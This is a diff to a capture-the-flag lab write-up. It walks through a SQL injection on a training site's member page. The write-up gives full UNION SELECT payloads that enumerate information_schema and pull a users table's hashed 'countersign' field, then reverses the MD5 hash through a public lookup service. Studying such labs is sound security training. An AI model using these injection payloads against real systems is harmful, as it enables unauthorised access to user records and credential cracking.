@@ -4,6 +4,8 @@
 
 This challenge involved a multi-step SQL injection process starting with a simple condition:
 
+You need to open the page `/?page=member` and submit the input:
+
 ``0=0``
 
 This returned 4 users, one of whom had the names:
@@ -18,18 +20,18 @@ We began enumeration using a classic UNION SELECT injection:
 → Revealed: `Member_Sql_Injection`
 
 **Step 2 – Table Enumeration**
-``0=0 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=CHAR(...)--``  
+``0=0 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)--``  
 → Found table: `users`
 
 **Step 3 – Column Enumeration**
-``0=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(117,...) AND table_schema=CHAR(...)--``  
+``0=0 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=CHAR(117,115,101,114,115) AND table_schema=CHAR(77,101,109,98,101,114,95,83,113,108,95,73,110,106,101,99,116,105,111,110)--``  
 → Columns found:  
 `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, `Commentaire`, `countersign`
 
 **Step 4 – Data Extraction**
 We then queried the suspected user row with:
 
-``0=0 UNION SELECT first_name, column FROM users--``
+``0=0 UNION SELECT first_name, [column] FROM users--``
 
 This gave us:
 
@@ -41,12 +43,11 @@ This gave us:
 
 **Step 5 – Hash Decoding**
 
-The `countersign` value was an MD5 hash. Using a public hash lookup service:
+The `countersign` value was an MD5 hash. Using a [public hash lookup](https://md5.gromweb.com/?md5=5ff9d0165b4f92b14994e5c685cdce28) service:
 
 → `5ff9d0165b4f92b14994e5c685cdce28` = `FortyTwo`  
 → Lowercase: `fortytwo`  
-→ SHA256 of `fortytwo` =  
-`10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`
+→ [SHA256](https://10015.io/tools/sha256-encrypt-decrypt) of `fortytwo` = [flag](../flag)
 
 **This is our final flag.**
 
@@ -79,8 +80,8 @@ References:
 
 <table width="100%">
   <tr>
-    <td align="left"><a href="../../Breach08_SQLi_UnionExtractFlag/Ressources/writeup.md">← Previous: Breach08</a></td>
+    <td align="left"><a href="../../Breach07_SpoofedHeaderAccessBypass/Ressources/writeup.md">← Previous: Breach08</a></td>
     <td align="center"><a href="../../README.md">↑ Back to README</a></td>
-    <td align="right"><a href="../../Breach10_SurveyValueBypass/Ressources/writeup.md">Next: Breach10 →</a></td>
+    <td align="right"><a href="../../Breach09_SQLi_UnionExtractFlag/Ressources/writeup.md">Next: Breach10 →</a></td>
   </tr>
 </table>
